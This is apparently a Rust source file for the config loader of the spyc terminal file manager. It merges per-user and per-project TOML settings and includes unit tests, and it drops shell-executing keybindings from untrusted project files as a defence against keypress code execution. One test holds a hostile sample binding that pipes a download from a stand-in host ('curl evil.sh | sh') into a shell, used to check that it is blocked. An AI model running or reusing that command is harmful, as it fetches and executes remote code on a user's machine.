//! `.spycrc.toml` loader and runtime configuration.
//!
//! Two files are consulted in order:
//!   1. `$HOME/.spycrc.toml` — per-user defaults.
//!   2. `<cwd>/.spycrc.toml` — per-project overrides (win).
//!
//! Both are optional. Anything missing falls back to built-in defaults.
//!
//! See `dsl` for the `map KEY action [args]` line grammar.

pub mod dsl;

/// Embedded default config template — emitted by `spyc --print-config`.
/// Every option commented out at its default value, with a one-liner
/// explaining what it does. Round-trip parsed in tests so the dump
/// always loads cleanly with the current `Config` schema.
pub const DEFAULT_TEMPLATE: &str = include_str!("default.spycrc.toml");

use std::path::{Path, PathBuf};

use serde::Deserialize;

use crate::keymap::user::UserBinding;

#[derive(Debug, Clone, Default)]
pub struct Config {
    /// Keymap bindings parsed from the `keymap = [...]` array.
    pub bindings: Vec<UserBinding>,

    /// Color palette overrides.
    pub colors: ColorOverrides,

    /// Layout overrides (status bar position, etc.).
    pub layout: LayoutConfig,

    /// Pane / pty defaults.
    pub pane: PaneConfig,

    /// Yank / clipboard behavior knobs.
    pub yank: YankConfig,

    /// Markdown viewer behavior knobs.
    pub markdown: MarkdownConfig,

    /// Delete-action behavior knobs.
    pub delete: DeleteConfig,

    /// Ignore-mask definitions. When non-empty, they replace the
    /// built-in defaults wholesale.
    pub ignore_masks: Vec<IgnoreMask>,

    /// User-defined Quick Select patterns appended to the built-in
    /// set (URL, path, SHA, IPv4). Bad regexes are dropped at load
    /// time with a warning rather than failing the whole config.
    pub scan_patterns: Vec<crate::pane::quick_select::CustomPattern>,

    /// File paths we actually loaded from (for the watcher to track).
    pub sources: Vec<PathBuf>,

    /// Non-fatal config problems collected during load — e.g. a
    /// `[[scan.patterns]]` entry with an un-compilable regex. These
    /// don't fail the load (one typo shouldn't lock the user out of
    /// starting spyc), but they're surfaced via a startup / reload
    /// flash so the user knows part of their config didn't apply —
    /// not buried behind `--debug`.
    pub warnings: Vec<String>,
}

/// Where the status bar lives. Defaults to `Top` (matches stock spyc).
/// `Bottom` is convenient when running inside tmux/screen — the host
/// status line typically owns the top row, so spyc's bar moving to the
/// bottom (vim/tmux convention) prevents a double-bar.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum StatusPosition {
    #[default]
    Top,
    Bottom,
}

#[derive(Debug, Clone)]
pub struct LayoutConfig {
    /// `"top"` (default) or `"bottom"`. With `"bottom"` the prompt
    /// sits one row above the status bar (vim-style cmdline-above-
    /// statusline ordering).
    pub status_position: StatusPosition,
    /// Delay (ms) before the which-key chord-hint popup appears after a chord
    /// prefix is pressed and held. `0` disables the popup. Default 300.
    pub chord_hint_delay_ms: u64,
}

impl Default for LayoutConfig {
    fn default() -> Self {
        Self {
            status_position: StatusPosition::default(),
            chord_hint_delay_ms: 300,
        }
    }
}

/// On-disk shape of `[layout]`. Each field is `Option` so we can tell
/// "user didn't set this" apart from "user set this to the default" —
/// otherwise a project file with no `[layout]` would clobber a value
/// from the user file with the Deserialize default.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
struct FileLayout {
    #[serde(default)]
    status_position: Option<StatusPosition>,
    #[serde(default)]
    chord_hint_delay_ms: Option<u64>,
}

/// Working directory a freshly-spawned pane tab opens in (the `^a c`
/// prompt pre-fill and the bare-spawn / `F9 resume` paths).
/// `ProjectHome` (the default) anchors new panes to the sticky session
/// project root, so a pane lands at the project regardless of where the
/// file list has been browsed to; `BrowseDir` opens "here" — the focused
/// column's current listing dir. When `ProjectHome` is selected but no
/// PROJECT_HOME is set, both fall back to the browse dir.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum NewTabCwd {
    #[default]
    ProjectHome,
    BrowseDir,
}

/// Pane / pty defaults — the default command and cwd for `^a c`.
#[derive(Debug, Clone)]
pub struct PaneConfig {
    /// Default command pre-filled into the `^a c` (new tab) prompt.
    /// Falls back to `"claude"` when both this and `$SPYC_PANE_CMD`
    /// are unset, preserving long-standing behavior. The env var
    /// still wins so users can override per-shell on the fly.
    pub default_command: Option<String>,
    /// Where a new pane tab opens by default. See [`NewTabCwd`].
    pub new_tab_cwd: NewTabCwd,
    /// When true, `^a v` on a *Claude* pane reads Claude's on-disk
    /// conversation JSONL and renders the transcript, instead of
    /// the default terminal-scrollback capture. Codex always uses
    /// the transcript (terminal capture can't see its history); for
    /// Claude both work, so this is opt-in. Default false (keep the
    /// current terminal-capture behavior).
    pub claude_transcript_scrollback: bool,
    /// See `default.spycrc.toml` `[pane]` block for doc.
    pub agy_transcript_scrollback: bool,
}

impl Default for PaneConfig {
    fn default() -> Self {
        Self {
            default_command: None,
            new_tab_cwd: NewTabCwd::default(),
            claude_transcript_scrollback: false,
            agy_transcript_scrollback: true,
        }
    }
}

impl PaneConfig {
    /// Whether the transcript-scrollback view is enabled for the agent
    /// whose `TranscriptSpec` carries `key`. Decouples the transcript
    /// dispatch (in `crate::agent`) from the concrete config fields:
    /// a new agent's toggle is one arm here, not a hot-path edit.
    /// Unknown keys fall back to the profile-provided `default`.
    pub fn transcript_enabled(&self, key: &str, default: bool) -> bool {
        match key {
            "claude_transcript_scrollback" => self.claude_transcript_scrollback,
            "agy_transcript_scrollback" => self.agy_transcript_scrollback,
            _ => default,
        }
    }
}

/// On-disk shape of `[pane]`. `Option` for the same "didn't set"
/// distinguishability as `[layout]`.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
struct FilePane {
    #[serde(default)]
    default_command: Option<String>,
    #[serde(default)]
    new_tab_cwd: Option<NewTabCwd>,
    #[serde(default)]
    claude_transcript_scrollback: Option<bool>,
    #[serde(default)]
    agy_transcript_scrollback: Option<bool>,
}

/// Yank / clipboard knobs.
#[derive(Debug, Clone)]
pub struct YankConfig {
    /// When true, pager yanks (`y` / `Y` / visual-mode `y`) prepend a
    /// short header that identifies the source — the pager's title
    /// (e.g. `!cargo build`, `task #3: cargo test`, or the filename).
    /// Pasting the captured output elsewhere keeps the "what was
    /// running" context with the content. Default true.
    pub include_pager_title: bool,
}

impl Default for YankConfig {
    fn default() -> Self {
        Self {
            include_pager_title: true,
        }
    }
}

/// On-disk shape of `[yank]`. `Option` for the same "didn't set"
/// distinguishability as the other tables.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
struct FileYank {
    #[serde(default)]
    include_pager_title: Option<bool>,
}

/// Markdown viewer knobs.
#[derive(Debug, Clone)]
pub struct MarkdownConfig {
    /// When true (default), opening a `.md` / `.markdown` file via the
    /// pager lands in the *rendered* view; `m` toggles to source.
    /// When false, the pager opens in source view and `m` toggles to
    /// rendered. Per-side scroll memory works the same either way.
    pub open_as_rendered: bool,
}

impl Default for MarkdownConfig {
    fn default() -> Self {
        Self {
            open_as_rendered: true,
        }
    }
}

/// `[delete]` — confirmation behavior for `R` / `dd` removal.
#[derive(Debug, Clone)]
pub struct DeleteConfig {
    /// When true (default), `R` and `dd` show a `y/N` confirmation
    /// prompt before moving anything to the graveyard. Setting to
    /// false enables "yolo mode" — deletions fire immediately on
    /// `dd` / `R`, no prompt, no warning highlight. The graveyard
    /// is still the destination either way, so `gy` can recover.
    pub confirm: bool,
}

impl Default for DeleteConfig {
    fn default() -> Self {
        Self { confirm: true }
    }
}

/// On-disk shape of `[delete]`. `Option` for "didn't set" disambig
/// — letting the user write `[delete]` with no body still keeps
/// defaults.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
struct FileDelete {
    confirm: Option<bool>,
}

/// On-disk shape of `[markdown]`. `Option` for "didn't set" disambig.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
struct FileMarkdown {
    #[serde(default)]
    open_as_rendered: Option<bool>,
}

/// Define `ColorOverrides` and its `merge` from a single field list, so a
/// new color can't be added to the struct but forgotten in the merge (which
/// silently dropped `delete_warning` before — the field existed but was never
/// merged, so setting it in a config did nothing). One list = one edit.
macro_rules! color_overrides {
    ($($field:ident),+ $(,)?) => {
        /// Per-element color overrides parsed from `[colors]`. Each is an
        /// optional hex/named color; `None` means "use the theme default".
        #[derive(Debug, Clone, Default, Deserialize)]
        #[serde(deny_unknown_fields)]
        pub struct ColorOverrides {
            $(pub $field: Option<String>,)+
        }

        impl ColorOverrides {
            /// Merge `other` into `self`: any `Some` in `other` wins (later
            /// config file overrides earlier). Generated from the same field
            /// list as the struct, so the two can never drift.
            fn merge(&mut self, other: ColorOverrides) {
                $(merge_color(&mut self.$field, other.$field);)+
            }
        }
    };
}

color_overrides! {
    dir, exec, symlink, file, other,
    cursor_bg, cursor_fg, pick, take,
    status_user, status_path, status_suffix, prompt_prefix, delete_warning,
    diff_add_fg, diff_del_fg, diff_add_bg, diff_del_bg,
    diff_add_word_bg, diff_del_word_bg,
    diff_hunk_fg, diff_file_fg, diff_meta_fg,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct IgnoreMask {
    pub group: u8,
    #[serde(default)]
    pub patterns: Vec<String>,
    #[serde(default)]
    pub enabled: bool,
}

/// On-disk shape of a single `.spycrc.toml`. We parse each file into one
/// of these, then merge them into the final `Config`.
#[derive(Debug, Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct FileConfig {
    #[serde(default)]
    keymap: Vec<String>,
    #[serde(default)]
    colors: ColorOverrides,
    #[serde(default)]
    layout: FileLayout,
    #[serde(default)]
    pane: FilePane,
    #[serde(default)]
    yank: FileYank,
    #[serde(default)]
    markdown: FileMarkdown,
    #[serde(default)]
    delete: FileDelete,
    #[serde(default)]
    ignore_masks: Vec<IgnoreMask>,
    #[serde(default)]
    scan: ScanConfig,
}

/// On-disk shape of `[scan]`. Holds Quick Select pattern
/// definitions; bad regexes are reported and dropped at load
/// rather than failing the whole config.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
struct ScanConfig {
    #[serde(default)]
    patterns: Vec<ScanPatternFile>,
}

/// On-disk shape of one `[[scan.patterns]]` entry.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct ScanPatternFile {
    name: String,
    regex: String,
    #[serde(default)]
    url: Option<String>,
}

/// Trust level of a config file. A `Project` (`<cwd>/.spycrc.toml`) file is
/// attacker-controllable, so its executing keymap bindings are dropped;
/// `Trusted` (`$HOME/.spycrc.toml`, or explicit caller-supplied paths) is
/// honored in full.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Trust {
    Trusted,
    Project,
}

impl Config {
    /// Load and merge the standard config file locations. Missing files
    /// are silently skipped; broken TOML / DSL returns an `Err`.
    ///
    /// The user file (`$HOME/.spycrc.toml`) is **trusted**; the project file
    /// (`<cwd>/.spycrc.toml`) is **not** — spyc is routinely pointed at
    /// hostile content (cloned repos, extracted tarballs), so a project rc
    /// must not be able to bind a key to a shell command (`unix`) or an
    /// arbitrary `jump`. Those executing bindings are dropped from the
    /// project file; cosmetic/behavioral settings ([colors], [layout], …)
    /// and plain rebindings are still honored.
    pub fn load_default(cwd: &Path) -> anyhow::Result<Self> {
        let user = home_dir().map(|h| h.join(".spycrc.toml"));
        let project = cwd.join(".spycrc.toml");
        let mut cfg = Self::default();
        if let Some(u) = user.as_deref() {
            cfg.load_one(u, Trust::Trusted)?;
        }
        cfg.load_one(&project, Trust::Project)?;
        Ok(cfg)
    }

    /// Load from an explicit list of candidate paths, all **trusted**. Later
    /// paths override earlier ones for settings; keymap bindings and ignore
    /// masks are **appended** in order so both files can contribute. Test-only
    /// since production loads via `load_default` (which assigns per-file
    /// trust); kept as the harness for the merge/precedence test matrix.
    #[cfg(test)]
    pub fn load_from(paths: &[Option<&Path>]) -> anyhow::Result<Self> {
        let mut cfg = Self::default();
        for path in paths.iter().flatten() {
            cfg.load_one(path, Trust::Trusted)?;
        }
        Ok(cfg)
    }

    /// Read + parse + merge one config file at the given trust level.
    /// Missing files are a no-op.
    fn load_one(&mut self, path: &Path, trust: Trust) -> anyhow::Result<()> {
        if !path.is_file() {
            return Ok(());
        }
        let text = std::fs::read_to_string(path)
            .map_err(|e| anyhow::anyhow!("reading {}: {e}", path.display()))?;
        let file: FileConfig = toml::from_str(&text)
            .map_err(|e| anyhow::anyhow!("parsing {}: {e}", path.display()))?;
        self.merge_file(file, path, trust)
    }

    fn merge_file(&mut self, file: FileConfig, source: &Path, trust: Trust) -> anyhow::Result<()> {
        self.sources.push(source.to_path_buf());

        // Colors: any Some() in this file overrides the accumulated value.
        // Field list lives once in the `color_overrides!` macro, so a new
        // color can't be merged-by-omission (which dropped delete_warning).
        self.colors.merge(file.colors);

        // Layout: per-field merge — only overwrite when the file
        // explicitly set the value (Some). Otherwise a project file
        // with no `[layout]` would clobber a value the user file set.
        if let Some(pos) = file.layout.status_position {
            self.layout.status_position = pos;
        }
        if let Some(ms) = file.layout.chord_hint_delay_ms {
            self.layout.chord_hint_delay_ms = ms;
        }

        // Pane: per-field merge for the same reason.
        if let Some(cmd) = file.pane.default_command {
            self.pane.default_command = Some(cmd);
        }
        if let Some(v) = file.pane.new_tab_cwd {
            self.pane.new_tab_cwd = v;
        }
        if let Some(b) = file.pane.claude_transcript_scrollback {
            self.pane.claude_transcript_scrollback = b;
        }
        if let Some(b) = file.pane.agy_transcript_scrollback {
            self.pane.agy_transcript_scrollback = b;
        }

        // Yank: per-field merge.
        if let Some(b) = file.yank.include_pager_title {
            self.yank.include_pager_title = b;
        }

        // Markdown: per-field merge.
        if let Some(b) = file.markdown.open_as_rendered {
            self.markdown.open_as_rendered = b;
        }

        // Delete: per-field merge.
        if let Some(b) = file.delete.confirm {
            self.delete.confirm = b;
        }

        // Ignore masks: append.
        self.ignore_masks.extend(file.ignore_masks);

        // Scan patterns: append. A bad regex is logged and skipped
        // rather than failing the whole config — one user-typed
        // typo shouldn't lock them out of starting spyc.
        for p in file.scan.patterns {
            match regex::Regex::new(&p.regex) {
                Ok(re) => self
                    .scan_patterns
                    .push(crate::pane::quick_select::CustomPattern {
                        name: p.name,
                        regex: re,
                        url_template: p.url,
                    }),
                Err(e) => {
                    crate::spyc_debug!(
                        "{}: scan pattern {:?}: bad regex — {e}",
                        source.display(),
                        p.name
                    );
                    // Also surface it to the user (flash), not only under
                    // --debug: a silently-dropped pattern just looks broken.
                    self.warnings
                        .push(format!("scan pattern {:?}: bad regex — {e}", p.name));
                }
            }
        }

        // Keymap: parse each line, append.
        for (i, line) in file.keymap.iter().enumerate() {
            let parsed = dsl::parse(line)
                .map_err(|e| anyhow::anyhow!("{}: keymap[{i}]: {e}", source.display()))?;
            if let Some(binding) = parsed {
                // An untrusted (project-local) rc may not introduce a binding
                // that runs a shell command or jumps to an arbitrary path on a
                // keypress — that's the `.spycrc` keypress-RCE vector. Drop it
                // silently and keep loading the rest (erroring here would
                // discard the trusted $HOME config too). Such bindings must
                // live in $HOME/.spycrc.toml. Plain prompt-openers
                // (copy/move/remove) carry no payload and are left alone.
                if trust == Trust::Project && binding.action.is_executing() {
                    continue;
                }
                self.bindings.push(binding);
            }
        }
        Ok(())
    }
}

fn merge_color(dst: &mut Option<String>, src: Option<String>) {
    if src.is_some() {
        *dst = src;
    }
}

fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME").map(PathBuf::from)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::tempdir;

    #[test]
    fn default_template_round_trips() {
        // The dump emitted by `spyc --print-config` must always parse
        // cleanly with the current schema — every option is commented
        // out so the parsed FileConfig equals FileConfig::default().
        let file: FileConfig = toml::from_str(super::DEFAULT_TEMPLATE).unwrap();
        assert!(file.keymap.is_empty());
        assert!(file.colors.dir.is_none());
        assert!(file.ignore_masks.is_empty());
        assert!(file.layout.status_position.is_none());
        assert!(file.pane.default_command.is_none());
        assert!(file.pane.new_tab_cwd.is_none());
        assert!(file.yank.include_pager_title.is_none());
        assert!(file.markdown.open_as_rendered.is_none());
    }

    #[test]
    fn new_tab_cwd_defaults_to_project_home() {
        assert_eq!(Config::default().pane.new_tab_cwd, NewTabCwd::ProjectHome);
    }

    #[test]
    fn parses_pane_new_tab_cwd_browse_dir() {
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("rc.toml");
        std::fs::write(&path, "[pane]\nnew_tab_cwd = \"browse_dir\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        assert_eq!(cfg.pane.new_tab_cwd, NewTabCwd::BrowseDir);
    }

    #[test]
    fn project_without_pane_does_not_clobber_user_new_tab_cwd() {
        let tmp = tempdir().unwrap();
        let user = tmp.path().join("user.toml");
        let project = tmp.path().join("project.toml");
        std::fs::write(&user, "[pane]\nnew_tab_cwd = \"browse_dir\"\n").unwrap();
        // Project file has no [pane] — must not reset to the default.
        std::fs::write(&project, "[colors]\ndir = \"blue\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&user), Some(&project)]).unwrap();
        assert_eq!(cfg.pane.new_tab_cwd, NewTabCwd::BrowseDir);
    }

    #[test]
    fn markdown_open_as_rendered_defaults_to_true() {
        assert!(Config::default().markdown.open_as_rendered);
    }

    #[test]
    fn parses_markdown_open_as_rendered_false() {
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("rc.toml");
        std::fs::write(&path, "[markdown]\nopen_as_rendered = false\n").unwrap();
        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        assert!(!cfg.markdown.open_as_rendered);
    }

    #[test]
    fn project_without_markdown_does_not_clobber_user_markdown() {
        let tmp = tempdir().unwrap();
        let user = tmp.path().join("user.toml");
        let project = tmp.path().join("project.toml");
        std::fs::write(&user, "[markdown]\nopen_as_rendered = false\n").unwrap();
        std::fs::write(&project, "[colors]\ndir = \"#abcdef\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&user), Some(&project)]).unwrap();
        assert!(!cfg.markdown.open_as_rendered);
    }

    #[test]
    fn yank_include_pager_title_defaults_to_true() {
        assert!(Config::default().yank.include_pager_title);
    }

    #[test]
    fn parses_yank_include_pager_title_false() {
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("rc.toml");
        std::fs::write(&path, "[yank]\ninclude_pager_title = false\n").unwrap();
        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        assert!(!cfg.yank.include_pager_title);
    }

    #[test]
    fn project_without_yank_does_not_clobber_user_yank() {
        let tmp = tempdir().unwrap();
        let user = tmp.path().join("user.toml");
        let project = tmp.path().join("project.toml");
        std::fs::write(&user, "[yank]\ninclude_pager_title = false\n").unwrap();
        std::fs::write(&project, "[colors]\ndir = \"#abcdef\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&user), Some(&project)]).unwrap();
        assert!(!cfg.yank.include_pager_title);
    }

    #[test]
    fn parses_pane_default_command() {
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("rc.toml");
        std::fs::write(&path, "[pane]\ndefault_command = \"codex\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        assert_eq!(cfg.pane.default_command.as_deref(), Some("codex"));
    }

    #[test]
    fn claude_transcript_scrollback_defaults_false() {
        assert!(!Config::default().pane.claude_transcript_scrollback);
    }

    #[test]
    fn parses_claude_transcript_scrollback_true() {
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("rc.toml");
        std::fs::write(&path, "[pane]\nclaude_transcript_scrollback = true\n").unwrap();
        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        assert!(cfg.pane.claude_transcript_scrollback);
    }

    #[test]
    fn project_without_pane_does_not_clobber_user_pane() {
        let tmp = tempdir().unwrap();
        let user = tmp.path().join("user.toml");
        let project = tmp.path().join("project.toml");
        std::fs::write(&user, "[pane]\ndefault_command = \"codex\"\n").unwrap();
        // Project file has no [pane] — must not reset to default.
        std::fs::write(&project, "[colors]\ndir = \"#abcdef\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&user), Some(&project)]).unwrap();
        assert_eq!(cfg.pane.default_command.as_deref(), Some("codex"));
    }

    #[test]
    fn project_pane_overrides_user_pane() {
        let tmp = tempdir().unwrap();
        let user = tmp.path().join("user.toml");
        let project = tmp.path().join("project.toml");
        std::fs::write(&user, "[pane]\ndefault_command = \"codex\"\n").unwrap();
        std::fs::write(&project, "[pane]\ndefault_command = \"bash --login\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&user), Some(&project)]).unwrap();
        assert_eq!(cfg.pane.default_command.as_deref(), Some("bash --login"));
    }

    #[test]
    fn project_without_layout_does_not_clobber_user_layout() {
        let tmp = tempdir().unwrap();
        let user = tmp.path().join("user.toml");
        let project = tmp.path().join("project.toml");
        std::fs::write(&user, "[layout]\nstatus_position = \"bottom\"\n").unwrap();
        // Project file has no [layout] — must not reset to default.
        std::fs::write(&project, "[colors]\ndir = \"#abcdef\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&user), Some(&project)]).unwrap();
        assert_eq!(cfg.layout.status_position, StatusPosition::Bottom);
        assert_eq!(cfg.colors.dir.as_deref(), Some("#abcdef"));
    }

    #[test]
    fn parses_bottom_status_position() {
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("rc.toml");
        std::fs::write(&path, "[layout]\nstatus_position = \"bottom\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        assert_eq!(cfg.layout.status_position, StatusPosition::Bottom);
    }

    #[test]
    fn loads_empty_config_when_no_files() {
        let tmp = tempdir().unwrap();
        let cfg = Config::load_from(&[Some(&tmp.path().join("nope.toml"))]).unwrap();
        assert!(cfg.bindings.is_empty());
        assert!(cfg.sources.is_empty());
    }

    #[test]
    fn parses_keymap_and_colors() {
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("spycrc.toml");
        let mut f = std::fs::File::create(&path).unwrap();
        // Top-level scalar/array fields must come before any [table] or
        // they get parsed as members of the preceding table.
        writeln!(
            f,
            r##"
keymap = [
    "map f unix file %",
    "map H patternpick =*.hip",
]

[colors]
dir  = "#aabbcc"
exec = "#112233"
"##
        )
        .unwrap();

        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        assert_eq!(cfg.colors.dir.as_deref(), Some("#aabbcc"));
        assert_eq!(cfg.colors.exec.as_deref(), Some("#112233"));
        assert_eq!(cfg.bindings.len(), 2);
    }

    #[test]
    fn every_color_field_merges_including_delete_warning() {
        // Regression: the hand-written merge list omitted `delete_warning`,
        // so setting it in a config silently did nothing. The macro now
        // drives struct + merge from one field list. Set a representative
        // spread — notably delete_warning — and confirm each lands.
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("spycrc.toml");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(
            f,
            r##"
[colors]
dir = "#111111"
delete_warning = "#ff0000"
diff_meta_fg = "#222222"
"##
        )
        .unwrap();

        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        assert_eq!(cfg.colors.dir.as_deref(), Some("#111111"));
        assert_eq!(
            cfg.colors.delete_warning.as_deref(),
            Some("#ff0000"),
            "delete_warning must merge (was silently dropped)"
        );
        assert_eq!(cfg.colors.diff_meta_fg.as_deref(), Some("#222222"));
    }

    #[test]
    fn later_config_color_overrides_earlier() {
        // The macro-generated merge keeps "later file wins" semantics.
        let tmp = tempdir().unwrap();
        let a = tmp.path().join("a.toml");
        let b = tmp.path().join("b.toml");
        std::fs::write(&a, "[colors]\ndir = \"#aaaaaa\"\ntake = \"#bbbbbb\"\n").unwrap();
        std::fs::write(&b, "[colors]\ndir = \"#cccccc\"\n").unwrap();
        let cfg = Config::load_from(&[Some(&a), Some(&b)]).unwrap();
        // b overrode dir; take only set in a, so it survives.
        assert_eq!(cfg.colors.dir.as_deref(), Some("#cccccc"));
        assert_eq!(cfg.colors.take.as_deref(), Some("#bbbbbb"));
    }

    #[test]
    fn bad_scan_pattern_regex_is_dropped_but_collected_as_warning() {
        // A `[[scan.patterns]]` with an un-compilable regex must NOT
        // fail the whole load (one typo shouldn't lock the user out),
        // but it must surface as a non-fatal warning — not vanish into
        // a --debug-only log. The valid pattern alongside it loads fine.
        let tmp = tempdir().unwrap();
        let path = tmp.path().join("spycrc.toml");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(
            f,
            r#"
[[scan.patterns]]
name = "good"
regex = "TICKET-[0-9]+"

[[scan.patterns]]
name = "broken"
regex = "TICKET-[0-9"
"#
        )
        .unwrap();

        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        // The good pattern still loaded; the broken one was dropped.
        assert_eq!(
            cfg.scan_patterns.len(),
            1,
            "only the compilable pattern should be kept"
        );
        // ...and the drop is visible as a warning naming the culprit.
        assert_eq!(cfg.warnings.len(), 1, "got: {:?}", cfg.warnings);
        assert!(
            cfg.warnings[0].contains("broken"),
            "warning should name the offending pattern: {:?}",
            cfg.warnings
        );
    }

    /// A project-local (untrusted) rc may set cosmetic options and rebind to
    /// built-in actions, but its `unix`/`jump` bindings — the keypress-RCE /
    /// arbitrary-navigation vector — are dropped.
    #[test]
    fn project_config_drops_executing_bindings_keeps_cosmetic() {
        let tmp = tempdir().unwrap();
        let path = tmp.path().join(".spycrc.toml");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(
            f,
            r##"
keymap = [
    "map j unix curl evil.sh | sh",
    "map g jump =/etc",
    "map K down",
]

[colors]
dir = "#aabbcc"
"##
        )
        .unwrap();

        let mut cfg = Config::default();
        cfg.load_one(&path, Trust::Project).unwrap();
        // Cosmetic settings from a project rc are honored.
        assert_eq!(cfg.colors.dir.as_deref(), Some("#aabbcc"));
        // The plain rebinding (`down`) survives; the executing `unix`/`jump`
        // bindings are dropped.
        assert_eq!(cfg.bindings.len(), 1, "only the plain rebinding survives");
        assert!(
            !cfg.bindings.iter().any(|b| b.action.is_executing()),
            "no executing binding may come from a project rc"
        );
    }

    #[test]
    fn trusted_config_keeps_executing_bindings() {
        use crate::keymap::user::BoundAction;
        let tmp = tempdir().unwrap();
        let path = tmp.path().join(".spycrc.toml");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(
            f,
            r#"
keymap = [
    "map j unix make %",
    "map g jump =/usr/local",
]
"#
        )
        .unwrap();

        let mut cfg = Config::default();
        cfg.load_one(&path, Trust::Trusted).unwrap();
        assert_eq!(cfg.bindings.len(), 2, "$HOME rc keeps executing bindings");
        assert!(
            cfg.bindings
                .iter()
                .any(|b| matches!(b.action, BoundAction::UnixCmd(_)))
        );
    }

    // ── DSL → Resolver → Action round-trip tests ──────────────────

    #[test]
    fn dsl_unix_binding_round_trips_through_resolver() {
        use crate::keymap::resolver::{Resolver, ResolverOutcome};
        use crate::keymap::user::{BoundAction, UserKeymap};
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

        let binding = dsl::parse("map f unix file %").unwrap().unwrap();
        let keymap = UserKeymap::from_bindings(vec![binding]);
        let mut resolver = Resolver::new();

        let ev = KeyEvent::new(KeyCode::Char('f'), KeyModifiers::NONE);
        let out = resolver.feed(ev, &keymap);
        assert_eq!(
            out,
            ResolverOutcome::User(BoundAction::UnixCmd("file %".to_string()))
        );
    }

    #[test]
    fn dsl_ctrl_binding_round_trips() {
        use crate::keymap::resolver::{Resolver, ResolverOutcome};
        use crate::keymap::user::{BoundAction, UserKeymap};
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

        let binding = dsl::parse("map ^P unix ps aux").unwrap().unwrap();
        let keymap = UserKeymap::from_bindings(vec![binding]);
        let mut resolver = Resolver::new();

        let ev = KeyEvent::new(KeyCode::Char('p'), KeyModifiers::CONTROL);
        let out = resolver.feed(ev, &keymap);
        assert_eq!(
            out,
            ResolverOutcome::User(BoundAction::UnixCmd("ps aux".to_string()))
        );
    }

    #[test]
    fn dsl_jump_binding_round_trips() {
        use crate::keymap::resolver::{Resolver, ResolverOutcome};
        use crate::keymap::user::{BoundAction, UserKeymap};
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

        let binding = dsl::parse("map X jump =/usr/local").unwrap().unwrap();
        let keymap = UserKeymap::from_bindings(vec![binding]);
        let mut resolver = Resolver::new();

        let ev = KeyEvent::new(KeyCode::Char('X'), KeyModifiers::NONE);
        let out = resolver.feed(ev, &keymap);
        assert_eq!(
            out,
            ResolverOutcome::User(BoundAction::Jump("/usr/local".to_string()))
        );
    }

    #[test]
    fn dsl_plain_action_round_trips() {
        use crate::keymap::action::Action;
        use crate::keymap::resolver::{Resolver, ResolverOutcome};
        use crate::keymap::user::{BoundAction, UserKeymap};
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

        let binding = dsl::parse("map X quit").unwrap().unwrap();
        let keymap = UserKeymap::from_bindings(vec![binding]);
        let mut resolver = Resolver::new();

        let ev = KeyEvent::new(KeyCode::Char('X'), KeyModifiers::NONE);
        let out = resolver.feed(ev, &keymap);
        assert_eq!(out, ResolverOutcome::User(BoundAction::Plain(Action::Quit)));
    }

    #[test]
    fn full_config_file_round_trip() {
        use crate::keymap::resolver::{Resolver, ResolverOutcome};
        use crate::keymap::user::{BoundAction, UserKeymap};
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

        let tmp = tempdir().unwrap();
        let path = tmp.path().join("test.toml");
        std::fs::write(
            &path,
            r#"
keymap = [
    "map f unix file %",
    "map g unix git status",
]
"#,
        )
        .unwrap();

        let cfg = Config::load_from(&[Some(&path)]).unwrap();
        let keymap = UserKeymap::from_bindings(cfg.bindings);
        let mut resolver = Resolver::new();

        // 'f' should fire the first binding
        let out = resolver.feed(
            KeyEvent::new(KeyCode::Char('f'), KeyModifiers::NONE),
            &keymap,
        );
        assert_eq!(
            out,
            ResolverOutcome::User(BoundAction::UnixCmd("file %".to_string()))
        );

        // 'g' should fire the second (overrides built-in 'g' pending)
        let out = resolver.feed(
            KeyEvent::new(KeyCode::Char('g'), KeyModifiers::NONE),
            &keymap,
